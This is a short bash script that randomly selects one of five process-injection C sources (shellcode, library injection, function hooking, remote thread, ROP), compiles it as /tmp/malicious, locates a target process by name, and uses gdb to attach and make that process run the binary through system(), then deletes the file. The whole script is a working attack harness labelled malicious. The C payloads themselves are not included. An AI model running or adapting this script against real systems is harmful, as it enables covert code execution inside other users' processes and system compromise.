#!/bin/bash

# Define the list of .c files
INJECTION_FILES=(
    "shellcode_injection.c"
    "library_injection.c"
    "function_hooking.c"
    "remote_thread.c"
    "rop_injection.c"
)

# Choose a random .c file from the list
RANDOM_INDEX=$((RANDOM % ${#INJECTION_FILES[@]}))
SELECTED_FILE="${INJECTION_FILES[$RANDOM_INDEX]}"

# Print the selected file for debugging
echo "Selected injection file: $SELECTED_FILE"

# Compile the selected .c file
gcc -o /tmp/malicious "$SELECTED_FILE"
if [ $? -ne 0 ]; then
    echo "Failed to compile $SELECTED_FILE"
    exit 1
fi

# Find the PID of the target process
PID=$(ps aux | grep 'target_process' | grep -v grep | awk '{print $2}')
if [ -z "$PID" ]; then
    echo "Target process not found"
    exit 1
fi

# Inject the compiled malicious code into the target process
gdb -p $PID -ex "call (void)system(\"/tmp/malicious\")" -ex "detach" -ex "quit"

# Clean up
rm -f /tmp/malicious

echo "Injection completed using $SELECTED_FILE"
